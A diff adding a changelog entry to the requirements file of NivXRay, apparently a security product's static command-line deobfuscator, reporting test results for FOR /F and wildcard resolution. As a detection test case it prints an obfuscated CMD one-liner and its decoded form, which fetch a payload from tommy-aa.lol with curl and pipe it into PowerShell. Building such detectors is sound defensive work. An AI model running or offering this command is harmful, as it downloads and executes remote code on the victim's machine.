@@ -1,6 +1,104 @@
 # NivXRay — Master Reminders + Product Requirements
 
 
+## ✅ 2026-09-02 · P0-1B · Phase 2 · Gate 2B · SHIPPED (STOPPED FOR ACCEPTANCE)
+
+Owner-authorised Gate 2B — CMD `FOR /F` semantic reconstruction +
+wildcard-executable resolution + LOLBAS registry expansion +
+direct canonicalize() integration. **XDR-owned, no external
+runtime dependency, no code copied.** Architecture rule
+(`decoder_bridge` disambiguation) locked in
+`P0_1B_SCOPE.md` — `services/decoder_bridge/` retains
+responsibility for Plane-A codec projection via the XDR-internal
+`recursive_decoder` and is slated for collapse into
+`services/decoder/` at Gate 2D.
+
+**Files changed / added:**
+- `services/decoder/cmd.py`  — added 2 capabilities
+  (`cmd.for_f_semantic`, `cmd.wildcard_exec_resolve`) + inner
+  static resolver + wildcard-to-regex helper. Total 7
+  capabilities registered: wrapper_unwrap, caret_strip,
+  set_reassembly, percent_var_resolve, delayed_expansion,
+  for_f_semantic, wildcard_exec_resolve.
+- `services/die/lolbas.py`   — 22 additional binaries (Gate 2B
+  seed for wildcard resolution), each carrying `provenance`.
+  Registry version 0.2.0-gate2a preserved; content growth is
+  cumulative.
+- `services/canonicalizer/__init__.py` — direct integration.
+  `canonicalize()` now calls `services.decoder.decode_universal()`
+  after the codec path and appends CMD Plane-B layers to
+  `decoded_layers` with `source="universal_decoder"`. Only
+  promotes `decoded_final` from the universal engine when the
+  codec path made no progress (preserves existing Plane-A
+  behaviour).
+- `tests/decoder_harness/harness.py` — 7 new semantic cases
+  (for-f, for-f-negative, wildcard, wildcard-benign,
+  tommy-aa-closure) + nested `gate_2a` / `gate_2b` structure.
+- `tests/decoder_harness/test_gate_2a.py` — added
+  `test_tommy_aa_gate_2b_closure`; Gate 2A substring check now
+  layer-only (intermediate strings are subsumed by Gate 2B).
+- `memory/P0_1B_SCOPE.md` — architecture rule locked
+  ("`decoder_bridge` must not mean bridge to external / legacy
+   decoders").
+
+**Gate 2B results (A→G harness · JSON @ `tests/decoder_harness/last_report.json`):**
+
+| Track | Status | Note |
+|---|---|---|
+| A · existing decoder corpus | RUN_VIA_C | 523 fixtures / 48 categories exercised via P0-1 corpus |
+| B · existing command corpus | RUN | trust_corpus (18) + NVKC (9) present; unchanged |
+| C · P0-1 76 scenarios | RUN | **verdict 0.9143 · malware FN [mal-20] · benign FP [] · surface F1 0.8929** — unchanged from P0-1A / Gate 2A |
+| D · historical regressions | RUN | adjacent tests green (decoder_bridge / intelligence_policy / phase2_final_gate 32/32) |
+| E · harvested external | BLOCKED | Gate 2F (offline generation) |
+| F · new semantic corpus | BLOCKED | Gate 2F |
+| G · **tommy-aa.lol · gate_2b_pass = True** | RUN | All 6 required layers fired · all 4 target substrings present |
+
+**tommy-aa.lol semantic closure (Track G):**
+Input: `C:\Windows\system32\cmd.exe /c start /min cmd /v:on /k echo off & set q8k3=where c*d.e?e & set r5m9=where c*u*r*l.e?e & set t2x7=where p*ell.exe & for /f %i in ('!q8k3!') do %i /c for /f %k in ('!r5m9!') do %k h^t^t^p^s^:^/^/^t^o^m^m^y^-^a^a^.^l^o^l^/f^|for /f %j in ('!t2x7!') do %j cmd`
+
+Layers emitted (6): `cmd.wrapper_unwrap → cmd.caret_strip
+(21 carets) → cmd.set_reassembly (Q8K3/R5M9/T2X7) →
+cmd.delayed_expansion (3 !VAR! resolved) → cmd.for_f_semantic
+(2 passes; %i↔cmd.exe, %j↔powershell.exe, %k↔curl.exe) →
+cmd.wildcard_exec_resolve`.
+
+Reconstruction: `start /min cmd /v:on /k echo off & set q8k3=where cmd.exe & set r5m9=where curl.exe & set t2x7=where powershell.exe & cmd.exe /c curl.exe https://tommy-aa.lol/f | powershell.exe cmd`
+
+All four target substrings present: `cmd.exe`, `curl.exe`,
+`powershell.exe`, `https://tommy-aa.lol/f`. **Never executed.**
+Provenance recorded end-to-end.
+
+**Semantic layer (21 curated cases across 15 categories):**
+21/21 pass · **benign FP = 0** · latency p50/p95/p99 = 0.025 /
+0.074 / 0.161 ms per decode. New categories delivered at 2B:
+`for-f` (2/2), `for-f-negative` (1/1 — unresolved inner honestly
+recorded), `wildcard` (2/2), `wildcard-benign` (1/1 — user
+wildcard `dir *.exe` does NOT trigger wildcard_exec_resolve),
+`tommy-aa-closure` (1/1).
+
+**Regressions:**
+- P0-1 aggregate metrics held identically to Gate 2A
+  (0.9143 / [] / [mal-20] / 0.8929 / decoder_layer 1.000).
+- 13 pre-existing per-scenario failures on the P0-1 corpus
+  unchanged (Gate 2C obf-05/06/07/14/15 targets + Gate 2D
+  IOC/attck floors). No new regressions introduced.
+- decoder_bridge / intelligence_policy / phase2_final_gate
+  32/32 green.
+
+**Architecture invariants preserved (all still structurally enforced):**
+- static_only=True / execution=False / attck_promotion=False
+- DECODED ≠ EXECUTED
+- Provenance mandatory (every layer)
+- Zero external runtime dependency (no bridge to CyberChef /
+  Invoke-* / PowerDecode / CMD-DeObfuscator / batch_deobfuscator
+  / BatchAlchemy)
+- Registry allow-list rejects DYNAMIC / UI / IRRELEVANT kinds
+
+**STOPPED for owner acceptance of Gate 2B before Gate 2C
+(PowerShell Plane-B) begins.**
+
+
+
 ## ✅ 2026-09-02 · P0-1B · Phase 2 · Gate 2A · SHIPPED (STOPPED FOR ACCEPTANCE)
 
 Owner-authorised Gate 2A widened to include CMD SET reassembly (option
